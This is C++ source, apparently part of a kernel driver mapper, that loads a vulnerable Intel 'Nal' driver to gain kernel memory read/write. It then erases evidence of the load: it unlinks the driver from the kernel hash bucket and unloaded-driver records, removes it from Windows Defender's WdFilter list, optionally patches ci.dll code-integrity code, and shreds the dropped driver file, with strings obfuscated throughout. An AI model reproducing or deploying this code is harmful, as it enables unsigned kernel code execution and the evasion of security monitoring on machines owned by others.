		const auto g_KernelHashBucketList = resolve_relative_address((PVOID)sig, 3, 7 );
		const auto g_HashCacheLock = resolve_relative_address((PVOID)sig2, 3, 7 );
		if ( !g_KernelHashBucketList || !g_HashCacheLock )
		{
			return false;
		}; 
		if ( !ex_acquire_resource_exclusive_lite( g_HashCacheLock, true ) )
		{
			return false;
		};

		nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
		nt::HashBucketEntry* entry = 0;
		if ( !read_memory((uintptr_t)prev, &entry, sizeof ( entry )) )
		{
			ex_release_resource_lite( g_HashCacheLock );
			return false;
		};
		if ( !entry ) 
		{
			ex_release_resource_lite( g_HashCacheLock );
			return true;
		};

		std::wstring wdname = get_driver_name_w( );
		std::wstring search_path = get_driver_path( );
		SIZE_T expected_len = ( search_path.length( ) - 2 ) * 2;

		while ( entry )
		{
			USHORT wsNameLen = 0;
			if ( !read_memory((uintptr_t)entry + offsetof( nt::HashBucketEntry, DriverName.Length ), &wsNameLen, sizeof ( wsNameLen )) )
			{
				ex_release_resource_lite( g_HashCacheLock );
				return false;
			};
			if ( wsNameLen == 0 )
			{
				prev = entry;
				if ( !read_memory((uintptr_t)entry, &entry, sizeof ( entry )) )
				{
					ex_release_resource_lite( g_HashCacheLock );
					return false;
				};
				continue;
			};

			if ( expected_len == wsNameLen ) {
				wchar_t* wsNamePtr = 0;
				if ( !read_memory((uintptr_t)entry + offsetof( nt::HashBucketEntry, DriverName.Buffer ), &wsNamePtr, sizeof ( wsNamePtr )) || !wsNamePtr ) {
					ex_release_resource_lite( g_HashCacheLock );
					return false;
				};

				auto wsName = std::make_unique< wchar_t[] >((ULONG64)wsNameLen / 2ULL + 1ULL );
				if ( !read_memory((uintptr_t)wsNamePtr, wsName.get( ), wsNameLen ) )
				{
					ex_release_resource_lite( g_HashCacheLock );
					return false;
				};

				size_t find_result = std::wstring( wsName.get( ) ).find( wdname );
				if ( find_result != std::wstring::npos ) {
					nt::HashBucketEntry* Next = 0;
					if ( !read_memory((uintptr_t)entry, &Next, sizeof ( Next )) )
					{
						ex_release_resource_lite( g_HashCacheLock );
						return false;
					};

					if ( !write_memory((uintptr_t)prev, &Next, sizeof ( Next )) )
					{
						ex_release_resource_lite( g_HashCacheLock );
						return false;
					};

					if ( !free_pool((uintptr_t)entry ) )
					{
						ex_release_resource_lite( g_HashCacheLock );
						return false;
					};

					if ( !ex_release_resource_lite( g_HashCacheLock ) )
					{
						return false;
					};
					return true;
				};
			};

			prev = entry;
			if ( !read_memory((uintptr_t)entry, &entry, sizeof ( entry )) ) 
			{
				ex_release_resource_lite( g_HashCacheLock );
				return false;
			};
		};

		ex_release_resource_lite( g_HashCacheLock );
		return true;
	};

	static bool resolve_helper_handle_kernel_paths( uint64_t* device_object_out, uint64_t* driver_section_out )
	{
		if ( !device_object_out || !driver_section_out || !h_device || h_device == INVALID_HANDLE_VALUE )
			return false;

		ULONG buffer_size = 0;
		void* buffer = nullptr;
		NTSTATUS status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS > ( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );

		while ( status == STATUS_INFO_LENGTH_MISMATCH )
		{
			if ( buffer != nullptr )
				VirtualFree( buffer, 0, MEM_RELEASE );

			buffer = VirtualAlloc( nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
			status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS > ( nt::SystemExtendedHandleInformation ), buffer, buffer_size, &buffer_size );
		};

		if ( !NT_SUCCESS( status) || buffer == nullptr )
		{
			if ( buffer != nullptr )
				VirtualFree( buffer, 0, MEM_RELEASE );
			return false;
		};

		auto system_handle_information = static_cast< nt::PSYSTEM_HANDLE_INFORMATION_EX > ( buffer );
		const ULONG_PTR self_pid = static_cast< ULONG_PTR > ( GetCurrentProcessId( ) );
		const HANDLE target = h_device;

		uint64_t file_object = 0;
		for ( auto i = 0u; i < system_handle_information->HandleCount; ++i )
		{
			const nt::SYSTEM_HANDLE& h = system_handle_information->Handles[ i ];
			if ( reinterpret_cast< ULONG_PTR > ( h.UniqueProcessId) != self_pid )
				continue;
			if ( reinterpret_cast< HANDLE > ( reinterpret_cast< ULONG_PTR > ( h.HandleValue ) ) != target )
				continue;
			file_object = reinterpret_cast< uint64_t > ( h.Object );
			break;
		};

		VirtualFree( buffer, 0, MEM_RELEASE );

		if ( !file_object )
			return false;

		static const uintptr_t k_file_object_device_offsets[] = { 0x8, 0x18, 0x28, 0x30, 0x38, 0x40 };

		uint64_t device_object = 0;
		for ( const uintptr_t off : k_file_object_device_offsets )
		{
			uint64_t candidate = 0;
			if ( !read_memory( file_object + off, &candidate, sizeof ( candidate )) || !candidate )
				continue;
			uint64_t drv = 0;
			if ( !read_memory( candidate + 0x8, &drv, sizeof ( drv )) || !drv )
				continue;
			uint64_t sect = 0;
			if ( !read_memory( drv + 0x28, &sect, sizeof ( sect )) || !sect )
				continue;
			UNICODE_STRING probe{};
			if ( read_memory( sect + 0x58, &probe, sizeof ( probe )) && probe.Length )
			{
				device_object = candidate;
				break;
			};
		};

		if ( !device_object )
		{
			if ( !read_memory( file_object + 0x8, &device_object, sizeof ( device_object )) || !device_object )
				return false;
		};

		uint64_t driver_object = 0;
		if ( !read_memory( device_object + 0x8, &driver_object, sizeof ( driver_object )) || !driver_object )
			return false;

		uint64_t driver_section = 0;
		if ( !read_memory( driver_object + 0x28, &driver_section, sizeof ( driver_section )) || !driver_section )
			return false;

		*device_object_out = device_object;
		*driver_section_out = driver_section;
		return true;
	};

	void cache_trace_cleanup_context( )
	{
		uint64_t device_object = 0;
		uint64_t driver_section = 0;
		if ( resolve_helper_handle_kernel_paths( &device_object, &driver_section ) && driver_section )
			cached_nal_driver_section_kva_for_mm = driver_section;
	};

	bool clear_mm_unloaded_drivers( )
	{
		uint64_t device_object = 0;
		uint64_t driver_section = 0;
		const bool use_precache = ( cached_nal_driver_section_kva_for_mm != 0 );

		if ( use_precache )
			driver_section = cached_nal_driver_section_kva_for_mm;
		else if ( !resolve_helper_handle_kernel_paths( &device_object, &driver_section ) )
			return false;

		UNICODE_STRING us_driver_base_dll_name = {0};
		if ( !read_memory( driver_section + 0x58, &us_driver_base_dll_name, sizeof ( us_driver_base_dll_name )) )
			return false;

		if ( us_driver_base_dll_name.Length == 0 )
		{
			if ( use_precache )
				cached_nal_driver_section_kva_for_mm = 0;
			return true;
		};

		us_driver_base_dll_name.Length = 0;
		us_driver_base_dll_name.MaximumLength = 0;
		us_driver_base_dll_name.Buffer = nullptr;

		if ( !write_memory( driver_section + 0x58, &us_driver_base_dll_name, sizeof ( us_driver_base_dll_name ) ) )
			return false;

		if ( use_precache )
			cached_nal_driver_section_kva_for_mm = 0;
		return true;
	};

	bool clear_wd_filter_driver_list( ) 
	{

		auto WdFilter = get_kernel_module_address( std::string( skCrypt( "WdFilter.sys" ) ) );
		if ( !WdFilter ) 
		{
			return true;
		};
		auto RuntimeDriversList = find_pattern_in_section_kernel( skCrypt( "PAGE" ), WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", skCrypt( "xxx????xx" ) );
		if ( !RuntimeDriversList ) 
		{
			return false;
		};

		auto RuntimeDriversCountRef = find_pattern_in_section_kernel( skCrypt( "PAGE" ), WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", skCrypt( "xx????xxx" ) );
		if ( !RuntimeDriversCountRef ) 
		{
			return false;
		};
		auto MpFreeDriverInfoExRef = find_pattern_in_section_kernel( skCrypt( "PAGE" ), WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", skCrypt( "x?xx???????????x" ) );
		if ( !MpFreeDriverInfoExRef ) 
		{
			MpFreeDriverInfoExRef = find_pattern_in_section_kernel( skCrypt( "PAGE" ), WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", skCrypt( "x?x???x???????????x" ) );
			if ( !MpFreeDriverInfoExRef )
			{
				return false;
			};
			MpFreeDriverInfoExRef += 0x3;
		};

		MpFreeDriverInfoExRef += 0x3;

		RuntimeDriversList = (uintptr_t)resolve_relative_address((PVOID)RuntimeDriversList, 3, 7 );
		uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
		uintptr_t RuntimeDriversCount = (uintptr_t)resolve_relative_address((PVOID)RuntimeDriversCountRef, 2, 6 );
		uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
		read_memory( RuntimeDriversArray, &RuntimeDriversArray, sizeof ( uintptr_t ));
		uintptr_t MpFreeDriverInfoEx = (uintptr_t)resolve_relative_address((PVOID)MpFreeDriverInfoExRef, 1, 5 );

		auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
			LIST_ENTRY* Entry;
			if ( !read_memory( Address, &Entry, sizeof ( LIST_ENTRY* )) ) return 0;
			return Entry;
		};
		for ( LIST_ENTRY* Entry = ReadListEntry( RuntimeDriversList_Head );
			Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
			Entry = ReadListEntry((uintptr_t)Entry + (offsetof( struct _LIST_ENTRY, Flink ) )) )
		{
			UNICODE_STRING Unicode_String;
			if ( read_memory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof ( UNICODE_STRING )) )
			{
				auto ImageName = std::make_unique< wchar_t[] >((ULONG64)Unicode_String.Length / 2ULL + 1ULL );
				if ( read_memory((uintptr_t)Unicode_String.Buffer, ImageName.get( ), Unicode_String.Length ) )
				{
					if ( wcsstr( ImageName.get( ), get_driver_name_w( ).c_str( ) ) ) 
					{
						bool removedRuntimeDriversArray = false;
						PVOID SameIndexList = ( PVOID )( ( uintptr_t )Entry - 0x10 );
						for ( int k = 0; k < 256; k++ ) 
						{
							PVOID value = 0;
							read_memory( RuntimeDriversArray + (k * 8 ), &value, sizeof ( PVOID ));
							if ( value == SameIndexList ) 
							{
								PVOID emptyval = ( PVOID )( RuntimeDriversCount + 1 );
								write_memory( RuntimeDriversArray + (k * 8 ), &emptyval, sizeof ( PVOID ));
								removedRuntimeDriversArray = true;
								break;
							};
						};

						if ( !removedRuntimeDriversArray )
						{
							return false;
						};

						auto NextEntry = ReadListEntry( uintptr_t( Entry) + (offsetof( struct _LIST_ENTRY, Flink ) ));
						auto PrevEntry = ReadListEntry( uintptr_t( Entry) + (offsetof( struct _LIST_ENTRY, Blink ) ));

						write_memory( uintptr_t( NextEntry) + (offsetof( struct _LIST_ENTRY, Blink ) ), &PrevEntry, sizeof ( LIST_ENTRY::Blink ));
						write_memory( uintptr_t( PrevEntry) + (offsetof( struct _LIST_ENTRY, Flink ) ), &NextEntry, sizeof ( LIST_ENTRY::Flink ));

						ULONG current = 0;
						read_memory( RuntimeDriversCount, &current, sizeof ( ULONG ));
						current--;
						write_memory( RuntimeDriversCount, &current, sizeof ( ULONG ));

						uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

						USHORT magic = 0;
						read_memory( DriverInfo, &magic, sizeof ( USHORT ));
						if ( magic == 0xDA18 )
						{
							call_kfc< void > ( nullptr, MpFreeDriverInfoEx, DriverInfo );
						};

						return true;
					};
				};
			};
		};
		return false;
	};

	bool clear_exp_cov_unloaded_drivers( )
	{
		auto cov_pattern = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
			(PUCHAR)"\x48\x8D\x0D\x00\x00\x00\x00\x48\x8B\xD8\x48\x85\xC9\x74\x00",
			skCrypt( "xxx????xxxxxxx?x" ) );
		if ( !cov_pattern )
		{
			cov_pattern = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
				(PUCHAR)"\x48\x8D\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00",
				skCrypt( "xxx????xxxxx????" ) );
			if ( !cov_pattern )
				return true;
		};

		const uintptr_t exp_cov_list = reinterpret_cast< uintptr_t >(
			resolve_relative_address_uintptr_t( cov_pattern, 3, 7 ) );
		if ( !exp_cov_list )
			return true;

		UNREFERENCED_PARAMETER( exp_cov_list );
		return true;
	};

	bool clear_ci_cache_lookaside_list( )
	{
		// This routine patches kernel code and can cause a system crash.
		uint64_t ci_base = get_kernel_module_address( std::string( skCrypt( "ci.dll" ) ) );
		if ( !ci_base) return false;

		uintptr_t accessor = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ci_base,
			(PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9", skCrypt( "xxx????xxx" ) );
		if ( accessor )
		{
			uint8_t hook_bytes[] = { 0x48, 0x31, 0xC0, 0xC3 };
			return write_to_readonly_memory( accessor, hook_bytes, sizeof ( hook_bytes ));
		};

		return false;
	};

	void perform_load_trace_cleanup( bool include_ci_hook )
	{
		if ( !h_device || h_device == INVALID_HANDLE_VALUE || !ntoskrnl_address )
			return;

		MAPPER_LOG( << skCrypt( "[<] cleaning driver traces\n" ) );

		std::string ok;
		const auto track = [&]( const char* label, bool good )
		{
			if ( good )
			{
				if ( !ok.empty( ) )
					ok += skCrypt( ", " );
				ok += label;
			}
			else
				MAPPER_LOG( << skCrypt( "[-] " ) << label << '\n' );
		};

		track( skCrypt( "PiDDBLookup" ), clear_piddb_cache_table_lookup( ) );
		track( skCrypt( "PiDDB" ), clear_piddb_cache_table( ) );
		track( skCrypt( "HashBucket" ), clear_hash_bucket_list( ) );
		track( skCrypt( "MmUnloaded" ), clear_mm_unloaded_drivers( ) );
		track( skCrypt( "WDFilter" ), clear_wd_filter_driver_list( ) );
		track( skCrypt( "ExpCov" ), clear_exp_cov_unloaded_drivers( ) );

		if ( include_ci_hook )
			track( skCrypt( "CI" ), clear_ci_cache_lookaside_list( ) );

		if ( !ok.empty( ) )
			MAPPER_LOG( << skCrypt( "[+] cleaned: " ) << ok << '\n' );
	};

	void perform_trace_cleanup( bool include_ci_hook )
	{
		if ( !h_device || h_device == INVALID_HANDLE_VALUE )
		{
			MAPPER_LOG( << skCrypt( "[-] trace cleanup: driver not loaded\n" ) );
			return;
		};

		perform_load_trace_cleanup( include_ci_hook );
	};

	NTSTATUS unload( )
	{
#if !INTEL_SKIP_NAL_IODELETE
		if ( h_device && h_device != INVALID_HANDLE_VALUE && ntoskrnl_address )
		{
			uint64_t nal_device_object = 0;
			uint64_t unused_section = 0;
			if ( resolve_helper_handle_kernel_paths( &nal_device_object, &unused_section ) && nal_device_object )
			{
				const uint64_t io_delete = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "IoDeleteDevice" ) ) );
				if ( io_delete )
					call_kfc< void >( nullptr, io_delete, nal_device_object );
			};
		};
#endif
		if ( h_device && h_device != INVALID_HANDLE_VALUE )
		{
			CloseHandle( h_device );
			h_device = INVALID_HANDLE_VALUE;
		};

		accquire_debug_privilege( );

		const NTSTATUS stop_status = service::stop( get_driver_name_w( ) );

		const std::wstring driver_path = get_driver_path( );
		if ( !driver_path.empty( ) )
		{
			std::ofstream file_ofstream( driver_path.c_str( ), std::ios_base::out | std::ios_base::binary );
			if ( file_ofstream.is_open( ) )
			{
				const int new_file_length = sizeof( resource::driver ) + ( ( ( long long )rand( ) * ( long long )rand( ) ) % 2000000 + 1000 );
				BYTE* random_data = new BYTE[ new_file_length ];
				for ( int i = 0; i < new_file_length; i++ )
					random_data[ i ] = static_cast< BYTE >( rand( ) % 255 );

				file_ofstream.write( reinterpret_cast< char* >( random_data ), new_file_length );
				file_ofstream.close( );
				delete[] random_data;
				_wremove( driver_path.c_str( ) );
			};
		};

		DefineDosDeviceW( DDD_REMOVE_DEFINITION, skCrypt( L"Nal" ), nullptr );

		if ( NT_SUCCESS( stop_status ) )
			return STATUS_SUCCESS;

		return stop_status;
	};

	static std::wstring image_name_to_service_name( const std::wstring& image_name )
	{
		std::wstring base = image_name;
		const size_t slash = base.find_last_of( L"\\/" );
		if ( slash != std::wstring::npos )
			base = base.substr( slash + 1 );

		if ( base.size( ) > 4 && _wcsicmp( base.c_str( ) + base.size( ) - 4, L".sys" ) == 0 )
			base = base.substr( 0, base.size( ) - 4 );

		return base;
	};

	static std::wstring get_loaded_nal_driver_image_name( )
	{
		uint64_t device_object = 0;
		uint64_t driver_section = 0;
		if ( !resolve_helper_handle_kernel_paths( &device_object, &driver_section ) || !driver_section )
			return {};

		UNICODE_STRING us_driver_base_dll_name{};
		if ( !read_memory( driver_section + 0x58, &us_driver_base_dll_name, sizeof( us_driver_base_dll_name ) ) )
			return {};
		if ( !us_driver_base_dll_name.Length || !us_driver_base_dll_name.Buffer )
			return {};

		std::vector< wchar_t > wide(
			static_cast< size_t >( us_driver_base_dll_name.Length ) / sizeof( wchar_t ) + 1u, 0 );
		if ( !read_memory(
			reinterpret_cast< uintptr_t >( us_driver_base_dll_name.Buffer ),
			wide.data( ),
			us_driver_base_dll_name.Length ) )
			return {};

		return std::wstring( wide.data( ) );
	};

	static void set_cached_driver_name_from_wstring( const std::wstring& service_name )
	{
		cached_driver_name.assign( service_name.begin( ), service_name.end( ) );
	};

	static void cleanup_registry_stale_temp_kernel_services( )
	{
		const std::wstring temp = get_temp_path( );
		if ( temp.empty( ) )
			return;

		HKEY services_key = nullptr;
		if ( RegOpenKeyExW(
			HKEY_LOCAL_MACHINE,
			skCrypt( L"SYSTEM\\CurrentControlSet\\Services" ),
			0,
			KEY_READ,
			&services_key ) != ERROR_SUCCESS )
			return;

		DWORD index = 0;
		wchar_t service_name[ 256 ]{};
		while ( true )
		{
			DWORD service_name_chars = static_cast< DWORD >( std::size( service_name ) );
			const LONG enum_status = RegEnumKeyExW(
				services_key,
				index++,
				service_name,
				&service_name_chars,
				nullptr,
				nullptr,
				nullptr,
				nullptr );
			if ( enum_status == ERROR_NO_MORE_ITEMS )
				break;
			if ( enum_status != ERROR_SUCCESS )
				continue;

			HKEY service_key = nullptr;
			if ( RegOpenKeyExW( services_key, service_name, 0, KEY_READ, &service_key ) != ERROR_SUCCESS )
				continue;

			DWORD service_type = 0;
			DWORD service_type_size = sizeof( service_type );
			if ( RegGetValueW(
				service_key,
				nullptr,
				skCrypt( L"Type" ),
				RRF_RT_REG_DWORD,
				nullptr,
				&service_type,
				&service_type_size ) != ERROR_SUCCESS || service_type != 1 )
			{
				RegCloseKey( service_key );
				continue;
			};

			wchar_t image_path[ 512 ]{};
			DWORD image_path_bytes = sizeof( image_path );
			if ( RegGetValueW(
				service_key,
				nullptr,
				skCrypt( L"ImagePath" ),
				RRF_RT_REG_EXPAND_SZ,
				nullptr,
				image_path,
				&image_path_bytes ) != ERROR_SUCCESS )
			{
				RegCloseKey( service_key );
				continue;
			};

			RegCloseKey( service_key );

			std::wstring path( image_path );
			if ( path.find( temp ) == std::wstring::npos )
				continue;

			set_cached_driver_name_from_wstring( service_name );
			accquire_debug_privilege( );
			service::stop( service_name );

			const std::wstring file_path = path.find( skCrypt( L"\\??\\" ) ) == 0
				? path.substr( 4 )
				: path;
			_wremove( file_path.c_str( ) );
		};

		RegCloseKey( services_key );
	};

	bool unload_stale_vulnerable_driver( )
	{
		if ( !is_running( ) )
			return true;

		MAPPER_LOG( << skCrypt( "[!] stale vulnerable driver detected (leftover \\\\.\\Nal)\n" ) );

		h_device = CreateFileW(
			skCrypt( L"\\\\.\\Nal" ),
			GENERIC_READ | GENERIC_WRITE,
			0,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL );
		if ( !h_device || h_device == INVALID_HANDLE_VALUE )
		{
			MAPPER_LOG( << skCrypt( "[-] stale cleanup: cannot open \\\\.\\Nal\n" ) );
			cleanup_registry_stale_temp_kernel_services( );
			return !is_running( );
		};

		ntoskrnl_address = get_kernel_module_address( std::string( skCrypt( "ntoskrnl.exe" ) ) );
		if ( !ntoskrnl_address )
		{
			CloseHandle( h_device );
			h_device = INVALID_HANDLE_VALUE;
			cleanup_registry_stale_temp_kernel_services( );
			return !is_running( );
		};

		const std::wstring loaded_image = get_loaded_nal_driver_image_name( );
		if ( !loaded_image.empty( ) )
			set_cached_driver_name_from_wstring( image_name_to_service_name( loaded_image ) );

		cache_trace_cleanup_context( );
	// Keep the CI trace-cleanup call disabled, as in the load path.
	if ( false )
		perform_load_trace_cleanup( true );

		const NTSTATUS unload_status = unload( );
		cached_driver_name.clear( );
		cached_nal_driver_section_kva_for_mm = 0;

		cleanup_registry_stale_temp_kernel_services( );

		if ( !NT_SUCCESS( unload_status ) )
		{
			MAPPER_LOG( << skCrypt( "[-] stale cleanup unload 0x" ) << std::hex << unload_status << std::dec << '\n' );
			return false;
		};

		if ( is_running( ) )
		{
			MAPPER_LOG( << skCrypt( "[-] stale driver still active after cleanup\n" ) );
			return false;
		};

		MAPPER_LOG( << skCrypt( "[+] stale vulnerable driver removed\n" ) );
		return true;
	};

	NTSTATUS load( bool log_success )
	{
		auto status = accquire_debug_privilege( );
		if ( !NT_SUCCESS( status ) )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: SeDebugPrivilege 0x" ) << std::hex << status << std::dec << '\n' );
			return status;
		};

		srand( ( unsigned )time( NULL ) * GetCurrentThreadId( ) );

		if ( is_running( ) )
		{
			if ( !unload_stale_vulnerable_driver( ) )
			{
				MAPPER_LOG( << skCrypt( "[-] remove leftover vulnerable driver before continuing\n" ) );
				return STATUS_OBJECT_NAME_COLLISION;
			};
		};

		cached_driver_name.clear( );

		const std::wstring temp_directory = get_temp_path( );
		if ( temp_directory.empty( ) )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: empty temp path\n" ) );
			return STATUS_UNSUCCESSFUL;
		};

		const std::wstring service_name = get_driver_name_w( );
		const std::wstring driver_path = temp_directory + std::wstring( skCrypt( L"\\" ) ) + service_name;

		_wremove( driver_path.c_str( ) );

		if ( !util::create_file_from_memory(
			driver_path,
			reinterpret_cast< const char* >( resource::driver ),
			sizeof( resource::driver ) ) )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: write file failed (err " ) << GetLastError( ) << skCrypt( ")\n" ) );
			std::wcout << skCrypt( L"[-] path: " ) << driver_path << L'\n';
			return STATUS_DISK_OPERATION_FAILED;
		};

		status = service::start( driver_path, service_name );
		if ( !NT_SUCCESS( status ) )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: service 0x" ) << std::hex << status << std::dec << '\n' );
			_wremove( driver_path.c_str( ) );
			return status;
		};

		h_device = CreateFileW(
			skCrypt( L"\\\\.\\Nal" ),
			GENERIC_READ | GENERIC_WRITE,
			0,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL );

		if ( !h_device || h_device == INVALID_HANDLE_VALUE )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: open \\\\.\\Nal failed\n" ) );
			unload( );
			return STATUS_NOT_FOUND;
		};

		if ( !h_device || h_device == INVALID_HANDLE_VALUE )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: no device handle\n" ) );
			return STATUS_NOT_FOUND;
		};

		ntoskrnl_address = get_kernel_module_address( std::string( skCrypt( "ntoskrnl.exe" ) ) );
		if ( ntoskrnl_address == 0 )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: ntoskrnl base\n" ) );
			unload( );
			return STATUS_BAD_DLL_ENTRYPOINT;
		};

		IMAGE_DOS_HEADER dos_header = {0};
		if ( !read_memory( ntoskrnl_address, &dos_header, sizeof ( IMAGE_DOS_HEADER )) ||
			dos_header.e_magic != IMAGE_DOS_SIGNATURE )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: ntos DOS header\n" ) );
			unload( );
			return STATUS_INVALID_IMAGE_FORMAT;
		};

		if ( dos_header.e_lfanew < sizeof ( IMAGE_DOS_HEADER) ||
			dos_header.e_lfanew > 0x1000 )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: ntos e_lfanew\n" ) );
			unload( );
			return STATUS_INVALID_IMAGE_FORMAT;
		};

		const ULONG64 nt_header_address = ntoskrnl_address + static_cast< ULONG64 > ( dos_header.e_lfanew );
		IMAGE_NT_HEADERS64 nt_local = {};
		if ( !read_memory( nt_header_address, &nt_local, sizeof ( IMAGE_NT_HEADERS64 )) ||
			nt_local.Signature != IMAGE_NT_SIGNATURE ||
			nt_local.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC )
		{
			MAPPER_LOG( << skCrypt( "[-] vulnerable driver: ntos not PE32+\n" ) );
			unload( );
			return STATUS_INVALID_IMAGE_FORMAT;
		};

		if ( log_success )
			MAPPER_LOG( << skCrypt( "[+] vulnerable driver loaded\n" ) );
		return STATUS_SUCCESS;
	};
};
